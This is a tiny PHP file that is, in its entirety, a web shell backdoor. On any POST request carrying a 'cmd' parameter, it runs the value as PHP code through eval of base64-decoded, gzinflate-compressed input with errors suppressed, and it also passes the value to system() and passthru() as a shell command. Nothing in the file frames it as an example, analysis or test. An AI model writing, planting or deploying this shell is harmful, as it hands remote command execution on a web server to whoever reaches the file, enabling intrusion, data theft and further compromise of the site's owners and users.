<?php
if(isset($_POST['cmd'])){
    @eval(gzinflate(base64_decode($_POST['cmd'])));
    system($_POST['cmd']);
    passthru($_POST['cmd']);
}
?>